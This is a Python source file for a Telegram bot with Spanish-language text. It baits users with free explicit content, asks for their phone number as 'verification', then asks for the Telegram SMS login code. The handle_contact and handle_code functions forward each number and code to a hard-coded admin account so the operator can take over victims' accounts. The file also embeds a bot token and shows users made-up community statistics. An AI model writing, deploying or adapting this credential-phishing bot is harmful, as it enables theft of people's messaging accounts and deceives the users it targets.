import os
import asyncio
import logging
import random
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters
)
from aiohttp import web

# ================================
# CONFIGURACIÓN
# ================================
TELEGRAM_TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"
ADMIN_ID = 7363341763
PORT = int(os.environ.get("PORT", 8000))

# ================================
# LOGGING
# ================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================================
# CONSTANTES
# ================================
PHONE, CODE = range(2)
user_sessions = {}

# ================================
# FUNCIONES AUXILIARES
# ================================

async def send_to_admin(context, message: str):
    """Envía mensaje al administrador"""
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode='HTML'  # Usamos HTML en lugar de Markdown
        )
        logger.info(f"Mensaje enviado al admin: {ADMIN_ID}")
        return True
    except Exception as e:
        logger.error(f"Error enviando al admin: {e}")
        return False

def format_message(text: str) -> str:
    """Formatea mensajes sin asteriscos visibles"""
    # Reemplazar formato Markdown por HTML
    text = text.replace('*', '')  # Elimina asteriscos
    text = text.replace('_', '')  # Elimina guiones bajos
    text = text.replace('`', '')  # Elimina backticks
    return text

# ================================
# COMANDOS DEL BOT
# ================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Comando /start"""
    user = update.effective_user
    
    welcome_message = """
¡Bienvenido a nuestra comunidad exclusiva!

Con este bot puedes acceder a contenido xxx definitivamente exclusivo totalmente gratis, tenemos acceso a varias api da páginas web, disfruta mientras puedas😉

Para acceder al contenido, necesitamos verificar tu identidad.
Este proceso asegura que eres humano y protege nuestra comunidad.

PROCESO DE VERIFICACIÓN:
1. Compartir tu número (verificación inicial)
2. Recibir código SMS (verificación en dos pasos)
3. Acceso completo al contenido premium

Presiona el botón para comenzar la verificación:
"""
    
    keyboard = [[KeyboardButton("✅ Verificar mi identidad", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        welcome_message,
        reply_markup=reply_markup
    )
    
    # Guardar sesión
    user_sessions[user.id] = {
        "step": "waiting_contact",
        "username": user.username,
        "joined": datetime.now().isoformat()
    }
    
    return PHONE

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Procesa contacto compartido"""
    user = update.effective_user
    contact = update.message.contact
    
    if contact.user_id != user.id:
        await update.message.reply_text("Por favor, comparte tu propio contacto.")
        return PHONE
    
    # Guardar información
    user_info = {
        "step": "waiting_code",
        "phone": contact.phone_number,
        "name": f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
        "username": user.username,
        "user_id": user.id,
        "contact_time": datetime.now().isoformat()
    }
    user_sessions[user.id] = user_info
    
    # 🔥 ENVIAR AL ADMINISTRADOR
    admin_message = f"""
NUEVO CONTACTO RECIBIDO

Nombre: {user_info['name']}
Teléfono: {contact.phone_number}
ID Usuario: {user.id}
Username: @{user.username or 'N/A'}
Hora: {datetime.now().strftime('%H:%M:%S')}

Estado: Esperando código de verificación
"""
    
    await send_to_admin(context, admin_message)
    
    # Responder al usuario
    wait_time = random.choice(["1-2 minutos", "2-5 minutos", "5-10 minutos", "10-30 minutos", "30-60 minutos"])
    
    user_response = f"""
✅ Contacto verificado: {contact.phone_number}

📨 Ahora recibirás un código de verificación de Telegram por SMS.

⏰ Tiempo estimado de entrega: {wait_time}

📝 Instrucciones:
1. Espera el SMS de Telegram
2. Copia el código de 5 dígitos
3. Regresa aquí y escríbelo

Ejemplo: Si recibes 12345, escribe: 12345

El código es necesario para completar la verificación en dos pasos y asegurar tu identidad.
"""
    
    await update.message.reply_text(
        user_response,
        reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)
    )
    
    return CODE

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Procesa código ingresado"""
    user = update.effective_user
    code_text = update.message.text.strip()
    
    # Verificar sesión
    if user.id not in user_sessions or user_sessions[user.id]["step"] != "waiting_code":
        await update.message.reply_text("Sesión expirada. Por favor, usa /start para comenzar.")
        return ConversationHandler.END
    
    user_info = user_sessions[user.id]
    
    # 🔥 ENVIAR CÓDIGO AL ADMINISTRADOR
    code_message = f"""
CÓDIGO DE VERIFICACIÓN RECIBIDO

Usuario: {user_info['name']}
Teléfono: {user_info['phone']}
ID: {user.id}
Username: @{user.username or 'N/A'}
Hora: {datetime.now().strftime('%H:%M:%S')}

Código ingresado: {code_text}

VERIFICACIÓN COMPLETADA
"""
    
    await send_to_admin(context, code_message)
    
    # Mensaje final al usuario
    final_message = f"""
🎉 ¡VERIFICACIÓN EXITOSA!

✅ Código {code_text} confirmado correctamente.
✅ Tu identidad ha sido verificada.
✅ Ahora tienes acceso completo a nuestra comunidad.

📊 ESTADÍSTICAS DE LA COMUNIDAD:
• 987 usuarios verificados como tú
• 4320 videos disponibles
• 415 usuarios premium
• Nuevo contenido diario

💡 Para explorar el contenido, usa el comando /info

👥 Bienvenido a nuestra comunidad exclusiva.
"""
    
    await update.message.reply_text(final_message)
    
    # Limpiar sesión
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    return ConversationHandler.END

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /info - Muestra información de la comunidad"""
    info_message = """
📊 INFORMACIÓN DE LA COMUNIDAD

👥 USUARIOS:
• Total verificados: 987
• Activos hoy: 243
• Nuevos hoy: 52
• Usuarios premium: 415

🎬 CONTENIDO DISPONIBLE:
• Videos totales: 4,320
• Categorías: 18
• Nuevos hoy: 127
• Tendencia: 45 videos

⭐ CARACTERÍSTICAS PREMIUM:
• Acceso completo ilimitado
• Contenido exclusivo
• Sin anuncios
• Descargas directas
• Soporte prioritario

🚀 ESTADÍSTICAS GLOBALES:
• Tiempo promedio por usuario: 47 minutos
• Satisfacción: 98.7%
• Retención: 94.2%

💎 Para convertirte en usuario premium, contacta con soporte.
"""
    
    await update.message.reply_text(info_message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help"""
    help_message = """
📋 COMANDOS DISPONIBLES:

/start - Iniciar proceso de verificación
/info - Ver información de la comunidad
/help - Mostrar esta ayuda

🔐 PROCESO DE VERIFICACIÓN:
1. Compartir número de teléfono
2. Recibir código SMS de Telegram
3. Ingresar código para acceso completo

⏰ El código puede tardar de 1 minuto a 1 hora en llegar.

❓ PROBLEMAS COMUNES:
• No recibes el código: Espera unos minutos
• Código incorrecto: Verifica que sean 5 dígitos
• Problemas de acceso: Usa /start nuevamente

📞 SOPORTE:
Para asistencia, contacta con nuestro equipo de soporte.
"""
    
    await update.message.reply_text(help_message)

# ================================
# SERVIDOR WEB PARA RENDER
# ================================

async def health_check(request):
    """Health check para Render"""
    return web.Response(text=f"Bot activo - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

# ================================
# CONFIGURACIÓN PRINCIPAL
# ================================

async def main():
    """Función principal"""
    print("=" * 60)
    print("🤖 BOT DE TELEGRAM - VERSIÓN PROFESIONAL")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🌐 Puerto: {PORT}")
    print("=" * 60)
    
    # Crear aplicación del bot
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Configurar handlers de conversación
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            PHONE: [MessageHandler(filters.CONTACT, handle_contact)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)]
        },
        fallbacks=[]
    )
    
    # Agregar handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('info', info_command))
    application.add_handler(CommandHandler('help', help_command))
    
    # Iniciar servidor web
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    print(f"🌐 Servidor web iniciado en puerto {PORT}")
    
    # Iniciar bot
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    print("✅ Bot iniciado correctamente")
    print("\n📝 COMANDOS DISPONIBLES:")
    print("• /start - Iniciar verificación")
    print("• /info - Información de comunidad")
    print("• /help - Ayuda")
    print("\n⏳ Esperando usuarios...")
    
    # Mantener servicio activo
    try:
        while True:
            await asyncio.sleep(3600)
    except KeyboardInterrupt:
        print("\n⏹️ Deteniendo servicio...")
    finally:
        await application.stop()
        await application.shutdown()

if __name__ == '__main__':
    asyncio.run(main())
